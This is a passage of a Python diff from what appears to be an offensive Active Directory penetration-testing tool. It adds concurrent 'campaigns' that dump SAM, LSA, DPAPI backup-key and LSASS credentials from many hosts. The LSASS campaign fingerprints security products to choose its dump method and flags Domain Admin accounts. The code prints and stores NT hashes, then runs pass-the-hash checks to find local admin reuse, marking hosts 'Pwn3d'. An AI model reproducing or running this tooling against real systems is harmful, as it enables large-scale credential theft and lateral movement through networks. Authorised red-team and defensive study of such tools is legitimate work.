+            secret=password,
+            islocal=islocal,
+        ):
+            _native_execute_dump_dpapi_bulk(shell, domain=domain, hosts=hosts)
+        return
 
-    if not command:
+    if not _explicit_native_dump_supported(
+        host=host, username=username, secret=password
+    ):
         print_warning(
-            "No valid command could be built for dump_dpapi with the provided parameters."
+            "Native DPAPI dump requires a single host and explicit credentials. "
+            "For bulk DPAPI dumping use 'All' or a valid targets file."
         )
         return
 
-    print_info_debug(f"Command: {command}")
-    execute_dump_dpapi(shell, command, domain, host, auth_username=username)
+    with _temporary_dump_creds(
+        shell,
+        domain=domain,
+        username=username,
+        secret=password,
+        islocal=islocal,
+    ):
+        execute_dump_dpapi(shell, "", domain, host, auth_username=username)
 
 
 def execute_dump_registries(shell: Any, command: str, domain: str) -> None:
-    """Execute registry dump command and trigger secretsdump on success."""
-    try:
-        completed_process = run_raw_impacket_command(
-            command,
-            script_name="reg.py",
-            timeout=300,
-            command_runner=RunCommandAdapter(shell.run_command),
-        )
-        if completed_process is None:
-            print_error("Error dumping registries: command did not return output.")
-            return
+    """Reject external registry dump command execution after native migration."""
+    _ = (shell, command, domain)
+    print_error(
+        "External registry dump execution has been removed. "
+        "Use run_dump_registries(), which uses native async RRP."
+    )
 
-        if completed_process.returncode == 0:
-            marked_domain = mark_sensitive(domain, "domain")
-            print_success(
-                f"Registries from the PDC of domain {marked_domain} dumped successfully"
+
+def _native_workspace_dir(shell: Any, domain: str) -> str:
+    """Resolve the SMB workspace directory for native dump downloads."""
+    domains_dir = getattr(shell, "domains_dir", None) or ""
+    return domain_relpath(domains_dir, domain, "smb")
+
+
+def _native_host_workspace_dir(shell: Any, domain: str, host: str) -> str:
+    """Resolve a per-host workspace directory for concurrent native downloads."""
+    token = _dump_target_token(host)
+    return os.path.join(_native_workspace_dir(shell, domain), "native_bulk", token)
+
+
+async def _run_native_dump_batch(
+    shell: Any,
+    *,
+    domain: str,
+    hosts: list[str],
+    dump_kind: str,
+) -> list[tuple[str, Any]]:
+    """Run one native dump method concurrently across hosts.
+
+    Includes a pre-flight TCP probe on port 445 to skip offline hosts before
+    paying the SMB + dump cost (especially important for LSASS which can spend
+    30s+ in remote-registry timeouts on an unreachable target).
+    """
+    if hosts:
+        reach = await filter_reachable_hosts(hosts, port=445)
+        print_reachability_summary(reach, service_label="SMB", console=_CONSOLE)
+        if not reach.reachable:
+            render_no_reachable_panel(
+                reach,
+                operation_label=f"{dump_kind.upper()} Bulk Dump",
+                console=_CONSOLE,
             )
-            shell.do_secretsdump_registries(domain)
-        else:
-            error_message = (
-                completed_process.stderr.strip()
-                if completed_process.stderr
-                else completed_process.stdout.strip()
+            return []
+        hosts = list(reach.reachable)
+
+    concurrency = _native_dump_concurrency(dump_kind)
+    semaphore = asyncio.Semaphore(concurrency)
+
+    async def _run_one(host: str) -> tuple[str, Any]:
+        async with semaphore:
+            svc = NativeDumpService()
+            config = _build_smb_config_from_shell(shell, host, domain)
+            workspace_dir = _native_host_workspace_dir(shell, domain, host)
+            if dump_kind == "sam":
+                result = await svc.dump_sam(config, workspace_dir=workspace_dir)
+            elif dump_kind == "lsa":
+                result = await svc.dump_lsa(config, workspace_dir=workspace_dir)
+            elif dump_kind == "dpapi":
+                result = await svc.dump_dpapi_backup_keys(config)
+            elif dump_kind == "lsass":
+                result = await svc.dump_lsass(
+                    config,
+                    workspace_dir=workspace_dir,
+                    prefer_backend="auto",
+                )
+            else:
+                raise ValueError(f"Unsupported native dump kind: {dump_kind}")
+            return host, result
+
+    return list(await asyncio.gather(*(_run_one(host) for host in hosts)))
+
+
+async def _run_native_dump_batch_live(
+    shell: Any,
+    *,
+    domain: str,
+    hosts: list[str],
+    dump_kind: str,
+    on_result: Any,  # Callable[[str, Any], tuple[int, list[str]]]
+) -> list[tuple[str, Any]]:
+    """Generic live bulk runner using asyncio.as_completed.
+
+    Streams ✓/✗ status lines and credential rows as each host completes
+    instead of waiting for the full gather to finish.
+
+    ``on_result(host, result)`` is called for each successful host and must
+    return ``(n_findings, display_lines)``. ``n_findings`` is used in the status
+    line, display_lines are printed as credential rows below it.
+
+    Includes a pre-flight TCP probe on port 445 to skip offline hosts. Bulk
+    dumps are the highest-value pre-flight target: a single LSASS attempt
+    against an offline workstation can waste 30s+ in remote-registry timeouts.
+    """
+
+    # Pre-flight reachability filter: skip offline hosts before paying the
+    # SMB + remote-registry cost. Critical at corporate scale where 30-50% of
+    # workstations may be powered off at any moment.
+    if hosts:
+        reach = await filter_reachable_hosts(hosts, port=445)
+        print_reachability_summary(reach, service_label="SMB", console=_CONSOLE)
+        if not reach.reachable:
+            render_no_reachable_panel(
+                reach,
+                operation_label=f"{dump_kind.upper()} Bulk Dump",
+                console=_CONSOLE,
             )
-            marked_domain = mark_sensitive(domain, "domain")
-            print_error(
-                f"Error dumping registries from the PDC of domain {marked_domain}: {error_message if error_message else 'Details not available'}"
-            )
-    except Exception as e:
-        telemetry.capture_exception(e)
-        marked_domain = mark_sensitive(domain, "domain")
-        print_error(
-            f"Error dumping registries from the PDC of domain {marked_domain}: {e}"
+            return []
+        hosts = list(reach.reachable)
+
+    concurrency = _native_dump_concurrency(dump_kind)
+    semaphore = asyncio.Semaphore(concurrency)
+    all_results: list[tuple[str, Any]] = []
+
+    async def _run_one(host: str) -> tuple[str, Any]:
+        async with semaphore:
+            svc = NativeDumpService()
+            config = _build_smb_config_from_shell(shell, host, domain)
+            ws = _native_host_workspace_dir(shell, domain, host)
+            if dump_kind == "sam":
+                result = await svc.dump_sam(config, workspace_dir=ws)
+            elif dump_kind == "lsa":
+                result = await svc.dump_lsa(config, workspace_dir=ws)
+            elif dump_kind == "dpapi":
+                result = await svc.dump_dpapi_backup_keys(config)
+            else:
+                raise ValueError(
+                    f"Unsupported dump kind for live runner: {dump_kind!r}"
+                )
+            return host, result
+
+    tasks = [asyncio.create_task(_run_one(h)) for h in hosts]
+
+    with Progress(
+        SpinnerColumn(style=_ICE),
+        BarColumn(bar_width=28, style=_MUTED, complete_style=_ICE),
+        MofNCompleteColumn(),
+        TextColumn("[{task.percentage:>3.0f}%]", style=_MUTED),
+        TimeElapsedColumn(),
+        console=_CONSOLE,
+        transient=False,
+    ) as prog:
+        task_id = prog.add_task("", total=len(hosts))
+        for coro in asyncio.as_completed(tasks):
+            host, result = await coro
+            all_results.append((host, result))
+            prog.advance(task_id)
+
+            if getattr(result, "success", False):
+                n, lines = on_result(host, result)
+                label = f"[{_ICE}]{n} finding{'s' if n != 1 else ''}[/{_ICE}]"
+                _CONSOLE.print(
+                    f"  [{_ACID}]✓[/{_ACID}] [{_MUTED}]{host}[/{_MUTED}]  {label}"
+                )
+                for line in lines:
+                    _CONSOLE.print(line)
+            else:
+                err = str(getattr(result, "error", "") or "")[:70]
+                _CONSOLE.print(
+                    f"  [{_LAVA}]✗[/{_LAVA}] [{_MUTED}]{host}[/{_MUTED}]"
+                    f"  [{_MUTED}]{err}[/{_MUTED}]"
+                )
+
+    return all_results
+
+
+def _render_bulk_summary(
+    dump_kind: str,
+    results: list[tuple[str, Any]],
+    finding_count: int,
+) -> None:
+    """Premium Rich Panel summary replacing the old print_info_table approach."""
+    total = len(results)
+    succeeded = sum(1 for _, r in results if getattr(r, "success", False))
+    failed = total - succeeded
+    failed_list = [
+        (h, str(getattr(r, "error", "") or "")[:80])
+        for h, r in results
+        if not getattr(r, "success", False)
+    ]
+
+    lines = [
+        f"[{_MUTED}]  Hosts     [/{_MUTED}] [{_ICE}]{total}[/{_ICE}] targeted"
+        f"  [{_ACID}]{succeeded}[/{_ACID}] ok"
+        f"  [{_LAVA}]{failed}[/{_LAVA}] failed",
+        f"[{_MUTED}]  Findings  [/{_MUTED}] [{_ACID}]{finding_count}[/{_ACID}]",
+    ]
+    border = _ACID if finding_count > 0 else (_AMBER if succeeded > 0 else _LAVA)
+    title_color = _ACID if finding_count > 0 else _AMBER
+    verdict_glyph = "✓" if finding_count > 0 else "○"
+    verdict_label = "Complete" if finding_count > 0 else "No Findings"
+    title = f"[bold {title_color}]{verdict_glyph}  {dump_kind.upper()} {verdict_label}[/bold {title_color}]"
+    _CONSOLE.print(
+        Panel("\n".join(lines), title=title, border_style=border, padding=(0, 1))
+    )
+
+    if failed_list:
+        fail_table = Table(
+            box=rbox.SIMPLE,
+            show_header=True,
+            header_style=f"bold {_MUTED}",
+            pad_edge=False,
         )
+        fail_table.add_column("Host", style=_MUTED)
+        fail_table.add_column("Error", style=_LAVA)
+        for h, err in failed_list[:20]:
+            fail_table.add_row(mark_sensitive(h, "hostname"), err)
+        _CONSOLE.print(fail_table)
+
+    _render_bulk_next_hint(
+        dump_kind, finding_count=finding_count, succeeded=succeeded
+    )
+
+
+async def _run_lsass_campaign_async(
+    shell: Any,
+    hosts: list[str],
+    domain: str,
+    workspace_dir: str,
+    method_name: str,
+    intel: "EdrIntelligence",
+) -> list[_LsassCampaignResult]:
+    """Async LSASS bulk campaign with live progress and per-host credential streaming.
+
+    Uses asyncio.as_completed so results display as hosts finish rather than
+    waiting for the slowest host. Credentials are saved to shell in-flight.
+    """
+    concurrency = _native_dump_concurrency("lsass")
+    semaphore = asyncio.Semaphore(concurrency)
+    _creds = getattr(shell, "current_creds", None) or {}
+    auth_username: str | None = str(_creds.get("username") or "").strip() or None
+    campaign_results: list[_LsassCampaignResult] = []
+
+    async def _run_one(host: str) -> _LsassCampaignResult:
+        async with semaphore:
+            config = _build_smb_config_from_shell(shell, host, domain)
+            host_ws = _native_host_workspace_dir(shell, domain, host)
+            orch = LsassDumpOrchestrator(
+                scratch_dir=host_ws,
+                progress_cb=lambda _s, _d: None,
+            )
+            result = await orch.run(
+                config=config,
+                workspace_dir=host_ws,
+                intel=intel,
+                preferred_method=method_name,
+            )
+            if not result.success or not result.dump_result:
+                return _LsassCampaignResult(
+                    host=host,
+                    success=False,
+                    cred_count=0,
+                    has_da_hint=False,
+                    method_used=method_name,
+                    error=(result.error or "failed")[:80],
+                )
+            creds = result.dump_result.credentials
+            return _LsassCampaignResult(
+                host=host,
+                success=True,
+                cred_count=len(creds),
+                has_da_hint=any(
+                    _lsass_is_da_hint(c.username) for c in creds if c.username
+                ),
+                method_used=result.method_used,
+                error=None,
+            ), creds
+
+    # Wrap to carry credentials alongside the result dataclass
+    async def _run_one_with_creds(host: str) -> tuple[_LsassCampaignResult, tuple]:
+        out = await _run_one(host)
+        if isinstance(out, tuple):
+            return out
+        return out, ()
+
+    tasks = [asyncio.create_task(_run_one_with_creds(h)) for h in hosts]
+
+    with Progress(
+        SpinnerColumn(style=_ICE),
+        BarColumn(bar_width=28, style=_MUTED, complete_style=_ICE),
+        MofNCompleteColumn(),
+        TextColumn("[{task.percentage:>3.0f}%]", style=_MUTED),
+        TimeElapsedColumn(),
+        console=_CONSOLE,
+        transient=False,
+    ) as prog:
+        task_id = prog.add_task("", total=len(hosts))
+
+        for coro in asyncio.as_completed(tasks):
+            r, creds = await coro
+            campaign_results.append(r)
+            prog.advance(task_id)
+
+            if r.success:
+                da_marker = f"  [{_AMBER}]⚡ DA[/{_AMBER}]" if r.has_da_hint else ""
+                _CONSOLE.print(
+                    f"  [{_ACID}]✓[/{_ACID}] [{_MUTED}]{r.host}[/{_MUTED}]"
+                    f"  [{_ICE}]{r.cred_count} cred{'s' if r.cred_count != 1 else ''}[/{_ICE}]"
+                    f"  [{_MUTED}]{r.method_used}[/{_MUTED}]{da_marker}"
+                )
+                for cred in creds:
+                    secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
+                    account = (
+                        f"{cred.domain}\\{cred.username}"
+                        if cred.domain
+                        else cred.username
+                    )
+                    if account and secret:
+                        _CONSOLE.print(
+                            f"    [{_MUTED}][LSASS][/{_MUTED}]  "
+                            f"[{_ACID}]{account}[/{_ACID}]"
+                            f"  [{_MUTED}]→  {secret[:32]}[/{_MUTED}]"
+                        )
+                        try:
+                            shell.add_credential(
+                                domain or cred.domain,
+                                cred.username,
+                                secret,
+                                source_steps=_build_dump_source_steps(
+                                    domain=domain,
+                                    dump_kind="LSASS",
+                                    host=r.host,
+                                    auth_username=auth_username,
+                                    credential_username=cred.username,
+                                    secret=secret,
+                                    source_protocol="smb",
+                                ),
+                                skip_hash_cracking=False,
+                                verify_credential=False,
+                                prompt_for_user_privs_after=False,
+                                ensure_fresh_kerberos_ticket=False,
+                                ui_silent=True,
+                                credential_origin="lsass_dump",
+                            )
+                        except Exception as exc:
+                            telemetry.capture_exception(exc)
+            else:
+                _CONSOLE.print(
+                    f"  [{_LAVA}]✗[/{_LAVA}] [{_MUTED}]{r.host}[/{_MUTED}]"
+                    f"  [{_MUTED}]{r.error or ''}[/{_MUTED}]"
+                )
+
+    return campaign_results
+
+
+def _print_native_bulk_result_summary(
+    *,
+    dump_kind: str,
+    total_hosts: int,
+    successful_hosts: int,
+    finding_count: int,
+    failed_hosts: list[tuple[str, str]],
+) -> None:
+    """Render a compact native bulk dump summary."""
+    rows = [
+        {
+            "Dump": dump_kind.upper(),
+            "Hosts": total_hosts,
+            "Succeeded": successful_hosts,
+            "Failed": len(failed_hosts),
+            "Findings": finding_count,
+        }
+    ]
+    print_info_table(
+        rows,
+        ["Dump", "Hosts", "Succeeded", "Failed", "Findings"],
+        title="Native Async Dump Summary",
+    )
+    if failed_hosts:
+        failure_rows = [
+            {"Host": mark_sensitive(host, "hostname"), "Error": error}
+            for host, error in failed_hosts[:15]
+        ]
+        print_info_table(failure_rows, ["Host", "Error"], title="Native Dump Failures")
+
+
+def _native_execute_dump_sam_bulk(
+    shell: Any,
+    *,
+    domain: str,
+    hosts: list[str],
+    auth_username: str | None,
+) -> None:
+    """Live SAM bulk campaign with inline admin badges and post-dump reuse matrix.
+
+    Each credential is tagged with ``[ADM]`` (local admin) or ``[usr]`` based on
+    SAMR BUILTIN\\Administrators membership enumerated during the dump itself.
+    Cross-host reuse is computed by pure data matching at the end (no extra
+    network round-trips, since the admin flag was set during extraction.
+    """
+    if not hosts:
+        print_warning("No targets for SAM campaign.")
+        return
+
+    _ = auth_username  # legacy parameter kept for compatibility
+    bulk_summary: dict[str, dict[str, Any]] = {}
+    bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
+    finding_count = 0
+    admin_finding_count = 0
+
+    def _on_result(host: str, result: Any) -> tuple[int, list[str]]:
+        nonlocal finding_count, admin_finding_count
+        lines: list[str] = []
+        n = 0
+        for cred in getattr(result, "credentials", ()):
+            ok, _ = _should_include_for_reuse_validation(
+                username=cred.username, rid=str(cred.rid), nt_hash=cred.nt_hash
+            )
+            if not ok:
+                continue
+            n += 1
+            finding_count += 1
+            is_admin = bool(getattr(cred, "is_local_admin", False))
+            if is_admin:
+                admin_finding_count += 1
+            _record_bulk_finding(
+                bulk_summary, host=host, username=cred.username, is_hash=True
+            )
+            _record_bulk_credential(
+                bulk_credentials,
+                username=cred.username,
+                credential=cred.nt_hash,
+                is_hash=True,
+                host=host,
+            )
+            badge = _SAM_ADM_BADGE if is_admin else _SAM_USR_BADGE
+            user_color = _LAVA if is_admin else _ACID
+            lines.append(
+                f"    [{_MUTED}][SAM][/{_MUTED}]  {badge}"
+                f"  [bold {user_color}]{cred.username}[/bold {user_color}]"
+                f"  [{_MUTED}]→  {cred.nt_hash[:32]}[/{_MUTED}]"
+            )
+        return n, lines
+
+    _CONSOLE.print(
+        f"\n[bold {_ICE}]◉  SAM Campaign[/bold {_ICE}]"
+        f"  [{_MUTED}]{len(hosts)} hosts[/{_MUTED}]\n"
+    )
+    results = _run_native_async(
+        _run_native_dump_batch_live(
+            shell, domain=domain, hosts=hosts, dump_kind="sam", on_result=_on_result
+        )
+    )
+    _CONSOLE.print()
+    _persist_bulk_sam_local_credentials(
+        shell, domain=domain, credentials=bulk_credentials
+    )
+    _print_bulk_summary(dump_kind="SAM", summary=bulk_summary)
+    _render_bulk_summary("SAM", results, finding_count)
+
+    # Post-dump reuse matrix: pure data match, no network. Highlights
+    # credentials that grant local admin on multiple hosts.
+    matrix = _build_local_admin_reuse_matrix(results)
+    if matrix:
+        attack_steps = sum(len(hosts_list) for hosts_list in matrix.values())
+        _CONSOLE.print()
+        _render_sam_reuse_matrix(matrix, attack_steps_generated=attack_steps)
+
+
+def _native_execute_dump_lsa_bulk(
+    shell: Any,
+    *,
+    domain: str,
+    hosts: list[str],
+    auth_username: str | None,
+    include_machine_accounts: bool,
+) -> None:
+    """Live LSA bulk campaign: streams machine-account hashes as each host completes."""
+    if not hosts:
+        print_warning("No targets for LSA campaign.")
+        return
+
+    bulk_summary: dict[str, dict[str, Any]] = {}
+    bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
+    finding_count = 0
+
+    def _on_result(host: str, result: Any) -> tuple[int, list[str]]:
+        nonlocal finding_count
+        machine_hash = getattr(result, "machine_account_nt_hash", None)
+        if not machine_hash:
+            return 0, []
+        machine_user = f"{host.split('.')[0]}$"
+        finding_count += 1
+        _record_bulk_finding(
+            bulk_summary, host=host, username=machine_user, is_hash=True
+        )
+        _record_bulk_credential(
+            bulk_credentials,
+            username=machine_user,
+            credential=machine_hash,
+            is_hash=True,
+            host=host,
+        )
+        line = (
+            f"    [{_MUTED}][LSA][/{_MUTED}]"
+            f"  [{_ACID}]{machine_user}[/{_ACID}]"
+            f"  [{_MUTED}]→  {machine_hash[:32]}[/{_MUTED}]"
+        )
+        return 1, [line]
+
+    _CONSOLE.print(
+        f"\n[bold {_ICE}]◉  LSA Campaign[/bold {_ICE}]"
+        f"  [{_MUTED}]{len(hosts)} hosts[/{_MUTED}]\n"
+    )
+    results = _run_native_async(
+        _run_native_dump_batch_live(
+            shell, domain=domain, hosts=hosts, dump_kind="lsa", on_result=_on_result
+        )
+    )
+    _CONSOLE.print()
+    _persist_bulk_credentials(
+        shell,
+        domain=domain,
+        dump_kind="LSA",
+        auth_username=auth_username,
+        credentials=bulk_credentials,
+        include_machine_accounts=include_machine_accounts,
+    )
+    _print_bulk_summary(dump_kind="LSA", summary=bulk_summary)
+    _render_bulk_summary("LSA", results, finding_count)
+
+
+def _native_execute_dump_dpapi_bulk(
+    shell: Any,
+    *,
+    domain: str,
+    hosts: list[str],
+) -> None:
+    """Live DPAPI bulk campaign: streams backup key GUIDs as each host completes."""
+    if not hosts:
+        print_warning("No targets for DPAPI campaign.")
+        return
+
+    finding_count = 0
+
+    def _on_result(host: str, result: Any) -> tuple[int, list[str]]:
+        nonlocal finding_count
+        keys = getattr(result, "backup_keys", ())
+        finding_count += len(keys)
+        lines = [
+            f"    [{_MUTED}][DPAPI][/{_MUTED}]"
+            f"  [{_ICE}]{key.guid}[/{_ICE}]"
+            f"  [{_MUTED}]{len(key.key_bytes)} bytes[/{_MUTED}]"
+            for key in keys
+        ]
+        return len(keys), lines
+
+    _CONSOLE.print(
+        f"\n[bold {_ICE}]◉  DPAPI Campaign[/bold {_ICE}]"
+        f"  [{_MUTED}]{len(hosts)} hosts[/{_MUTED}]\n"
+    )
+    results = _run_native_async(
+        _run_native_dump_batch_live(
+            shell, domain=domain, hosts=hosts, dump_kind="dpapi", on_result=_on_result
+        )
+    )
+    _CONSOLE.print()
+    _render_bulk_summary("DPAPI", results, finding_count)
+
+
+def _native_execute_dump_lsass_bulk(
+    shell: Any,
+    *,
+    domain: str,
+    hosts: list[str],
+) -> None:
+    """Intelligent LSASS bulk campaign: smart targeting → sample fingerprint → live sweep."""
+    if not hosts:
+        print_warning("No targets for LSASS campaign.")
+        return
+
+    workspace_dir = _native_workspace_dir(shell, domain)
+    intel = EdrIntelligence(workspace_dir)
+
+    # Smart targeting: DCs first, fall back to the full resolved list
+    dc_hosts, tier_label = _lsass_smart_targets(shell, domain)
+    if not dc_hosts:
+        dc_hosts = hosts
+        tier_label = f"{len(hosts)} hosts"
+
+    # Sample fingerprint on the first DC to drive method selection
+    fp_sample: HostFingerprint | None = None
+    try:
+        config_sample = _build_smb_config_from_shell(shell, dc_hosts[0], domain)
+        with Progress(
+            SpinnerColumn(style=_ICE),
+            TextColumn(f"[{_MUTED}]Fingerprinting {dc_hosts[0]}...[/{_MUTED}]"),
+            transient=True,
+            console=_CONSOLE,
+        ) as prog:
+            prog.add_task("")
+            fp_sample = _run_native_async(
+                HostFingerprintService().fingerprint(config_sample)
+            )
+        if fp_sample and fp_sample.detected_products:
+            intel.record_host_products(
+                config_sample.target_ip,
+                [(p.name, p.category) for p in fp_sample.detected_products],
+            )
+        if fp_sample:
+            ranked = LsassMethodSelector.rank(fp_sample, intel)
+            _render_fingerprint_panel(fp_sample, ranked)
+    except Exception as exc:
+        telemetry.capture_exception(exc)
+        fp_sample = None
+
+    ranked = LsassMethodSelector.rank(
+        fp_sample or HostFingerprint(target_ip="sample"), intel
+    )
+    best_method = ranked[0]
+
+    # Confirmation panel: offer to expand from DCs to all hosts
+    proceed, selected_hosts = _lsass_campaign_confirmation(
+        dc_hosts, tier_label, hosts, best_method
+    )
+    if not proceed:
+        return
+
+    _CONSOLE.print(
+        f"\n[bold {_ICE}]◉  LSASS Campaign[/bold {_ICE}]"
+        f"  [{_MUTED}]{tier_label}  ·  {len(selected_hosts)} hosts  ·  {best_method.name}[/{_MUTED}]\n"
+    )
+
+    results = _run_native_async(
+        _run_lsass_campaign_async(
+            shell, selected_hosts, domain, workspace_dir, best_method.name, intel
+        )
+    )
+
+    _CONSOLE.print()
+    _render_lsass_campaign_summary(results)
+
+
+# ---------------------------------------------------------------------------
+# SAM local-admin detection + reuse helpers
+# ---------------------------------------------------------------------------
+
+# Credential row for the stream: extra field signals admin status
+_SAM_ADM_BADGE = f"[bold {_LAVA}][ADM][/bold {_LAVA}]"
+_SAM_USR_BADGE = f"[{_MUTED}][usr][/{_MUTED}]"
+
+
+def _sam_admin_extras(cred: Any) -> str:
+    """Return the extras string for DumpDisplay.stream_credential."""
+    badge = _SAM_ADM_BADGE if getattr(cred, "is_local_admin", False) else _SAM_USR_BADGE
+    parts = [f"RID:{cred.rid}", badge]
+    is_enabled = getattr(cred, "is_enabled", True)
+    nt_hash = str(getattr(cred, "nt_hash", "") or "").lower()
+    if not is_enabled:
+        parts.append(f"[{_MUTED}]DISABLED[/{_MUTED}]")
+    elif nt_hash == _EMPTY_NTLM_HASH:
+        parts.append(f"[{_AMBER}]BLANK PWD[/{_AMBER}]")
+    return "  ".join(parts)
+
+
+def _build_local_admin_reuse_matrix(
+    results: list[tuple[str, Any]],
+) -> dict[tuple[str, str], list[str]]:
+    """Pure data: map (username, nt_hash) → [hosts where cred is local admin].
+
+    Only includes credentials where ``is_local_admin=True`` on at least one host.
+    The same (username, hash) pair seen on multiple hosts means password reuse.
+    """
+    matrix: dict[tuple[str, str], list[str]] = {}
+    for host, result in results:
+        if not getattr(result, "success", False):
+            continue
+        for cred in getattr(result, "credentials", ()):
+            if not getattr(cred, "is_local_admin", False):
+                continue
+            key = (cred.username, cred.nt_hash)
+            matrix.setdefault(key, []).append(host)
+    return matrix
+
+
+def _render_sam_reuse_matrix(
+    matrix: dict[tuple[str, str], list[str]],
+    attack_steps_generated: int = 0,
+) -> None:
+    """Premium Rich panel: local admin reuse matrix sorted by impact.
+
+    High-reuse credentials (≥3 hosts) get a lava highlight.
+    Single-host admin creds get a quieter acid color.
+    """
+    if not matrix:
+        _CONSOLE.print(
+            Panel(
+                f"[{_MUTED}]No local admin credentials found for reuse analysis.[/{_MUTED}]",
+                title=f"[{_MUTED}]Local Admin Reuse[/{_MUTED}]",
+                border_style=_MUTED,
+                padding=(0, 1),
+            )
+        )
+        return
+
+    table = Table(
+        box=rbox.SIMPLE,
+        show_header=True,
+        header_style=f"bold {_ICE}",
+        pad_edge=False,
+        show_edge=False,
+    )
+    table.add_column("", width=3, no_wrap=True)
+    table.add_column("User", style=f"bold {_ACID}", min_width=18, no_wrap=True)
+    table.add_column("Hash", style=_MUTED, width=10, no_wrap=True)
+    table.add_column("Admin on", justify="right", width=8)
+    table.add_column("Status", no_wrap=True)
+
+    sorted_creds = sorted(matrix.items(), key=lambda x: len(x[1]), reverse=True)
+    for (username, nt_hash), admin_hosts in sorted_creds:
+        n = len(admin_hosts)
+        if n >= 3:
+            icon = f"[bold {_LAVA}]⚡[/bold {_LAVA}]"
+            count_cell = f"[bold {_LAVA}]{n}[/bold {_LAVA}]"
+            status_cell = f"[bold {_LAVA}]Pwn3d × {n}[/bold {_LAVA}]"
+        elif n >= 2:
+            icon = f"[{_AMBER}]⚡[/{_AMBER}]"
+            count_cell = f"[{_AMBER}]{n}[/{_AMBER}]"
+            status_cell = f"[{_AMBER}]Pwn3d × {n}[/{_AMBER}]"
+        else:
+            icon = f"[{_ACID}]·[/{_ACID}]"
+            count_cell = f"[{_ACID}]{n}[/{_ACID}]"
+            status_cell = f"[{_ACID}]admin (1 host)[/{_ACID}]"
+        table.add_row(icon, username, nt_hash[:8] + "…", count_cell, status_cell)
+
+    total_pwned = sum(len(h) for h in matrix.values())
+    high_reuse = sum(1 for h in matrix.values() if len(h) >= 3)
+
+    lines: list[str] = []
+    if high_reuse:
+        lines.append(
+            f"[bold {_LAVA}]  ⚡  {high_reuse} credential{'s' if high_reuse != 1 else ''}"
+            f" reused across 3+ hosts[/bold {_LAVA}]"
+        )
+    if attack_steps_generated:
+        lines.append(
+            f"[{_MUTED}]  →  {attack_steps_generated} localadminpassreuse"
+            f" attack step{'s' if attack_steps_generated != 1 else ''} generated[/{_MUTED}]"
+        )
+
+    title_color = _LAVA if high_reuse else (_AMBER if total_pwned > 1 else _ACID)
+    _CONSOLE.print(
+        Panel(
+            "\n".join(lines) if lines else "",
+            title=f"[bold {title_color}]⚡  Local Admin Reuse Matrix[/bold {title_color}]",
+            subtitle=f"[{_MUTED}]{total_pwned} Pwn3d combinations[/{_MUTED}]",
+            border_style=title_color,
+            padding=(0, 1),
+        )
+    )
+    _CONSOLE.print(table)
+
+
+async def _run_native_local_admin_reuse_check_async(
+    shell: Any,
+    domain: str,
+    username: str,
+    nt_hash: str,
+    targets_file: str,
+) -> None:
+    """Native replacement for netexec --local-auth reuse check (single cred).
+
+    Reads targets from ``targets_file``, runs SMBPrivilegeConfig checks in
+    parallel, streams Pwn3d!/not-admin results live, and records attack steps.
+    """
+    hosts = _load_native_bulk_hosts(targets_file)
+    if not hosts:
+        print_warning("No SMB targets found for local admin reuse check.")
+        return
+
+    concurrency = _native_dump_concurrency("sam")  # 20 (auth-only, low overhead)
+    creds = getattr(shell, "current_creds", None) or {}
+    dc_ip = creds.get("dc_ip") or getattr(shell, "current_dc_ip", None) or ""
+
+    _CONSOLE.print(
+        f"\n[bold {_ICE}]◉  Local Admin Reuse[/bold {_ICE}]"
+        f"  [{_MUTED}]{username}  ·  {len(hosts)} hosts[/{_MUTED}]\n"
+    )
+
+    # Pre-flight TCP probe: filter offline hosts before paying the auth cost.
+    # Centralized via host_reachability_filter so every bulk-host caller (SAM
+    # dumps, LSA dumps, RDP/WinRM sweeps) uses the same vocabulary and tuning.
+    reach = await filter_reachable_hosts(hosts, port=445)
+    print_reachability_summary(reach, service_label="SMB", console=_CONSOLE)
+    if not reach.reachable:
+        render_no_reachable_panel(
+            reach, operation_label="Local Admin Reuse", console=_CONSOLE
+        )
+        return
+    reachable_hosts = list(reach.reachable)
+    offline_hosts = list(reach.offline)
+
+    configs = [
+        SMBPrivilegeConfig(
+            target_ip=h,
+            domain=".",  # local auth (".") means local machine
+            username=username,
+            nt_hash=nt_hash,
+            auth_domain=domain,
+            kdc_ip=dc_ip or h,
+            timeout=10,
+        )
+        for h in reachable_hosts
+    ]
+
+    pwned_hosts: list[str] = []
+
+    with Progress(
+        SpinnerColumn(style=_ICE),
+        BarColumn(bar_width=28, style=_MUTED, complete_style=_ICE),
+        MofNCompleteColumn(),
+        TextColumn("[{task.percentage:>3.0f}%]", style=_MUTED),
+        TimeElapsedColumn(),
+        console=_CONSOLE,
+        transient=False,
+    ) as prog:
+        task_id = prog.add_task("", total=len(configs))
+        results = await check_smb_privilege_batch(configs, max_concurrency=concurrency)
+        for r in results:
+            prog.advance(task_id)
+            if r.status == SMBPrivilegeStatus.ADMIN:
+                pwned_hosts.append(r.target_ip)
+                _CONSOLE.print(
+                    f"  [{_LAVA}]⚡  Pwn3d![/{_LAVA}]"
+                    f"  [{_ACID}]{r.display_host}[/{_ACID}]"
+                    f"  [{_MUTED}]local admin confirmed[/{_MUTED}]"
+                )
+            elif r.status == SMBPrivilegeStatus.NOT_ADMIN:
+                _CONSOLE.print(
+                    f"  [{_MUTED}]·   {r.display_host}  not admin[/{_MUTED}]"
+                )
+
+    _CONSOLE.print()
+    n_pwned = len(pwned_hosts)
+    if n_pwned:
+        _CONSOLE.print(
+            Panel(
+                f"[bold {_LAVA}]  ⚡  Pwn3d on {n_pwned} host{'s' if n_pwned != 1 else ''}[/bold {_LAVA}]\n"
+                f"[{_MUTED}]  user: {username}  ·  local admin reuse confirmed[/{_MUTED}]",
+                title=f"[bold {_LAVA}]⚡  Local Admin Reuse Found[/bold {_LAVA}]",
+                border_style=_LAVA,
+                padding=(0, 1),
+            )
+        )
+        # Record attack steps for each Pwn3d host
+        for h in pwned_hosts:
+            try:
+                shell.add_credential(
+                    domain,
+                    username,
+                    nt_hash,
+                    h,
+                    "smb",
+                    verify_local_credential=False,
+                    prompt_local_reuse_after=False,
+                    ui_silent=True,
+                )
+            except Exception as exc:
+                telemetry.capture_exception(exc)
+    else:
+        summary_lines = [
+            f"[{_MUTED}]  {username} is not local admin on any reachable host.[/{_MUTED}]",
+            (
+                f"[{_MUTED}]  {len(reachable_hosts)} reachable"
+                f"  ·  {len(offline_hosts)} offline (skipped)"
+                f"  ·  {len(hosts)} total[/{_MUTED}]"
+            ),
+        ]
+        _CONSOLE.print(
+            Panel(
+                "\n".join(summary_lines),
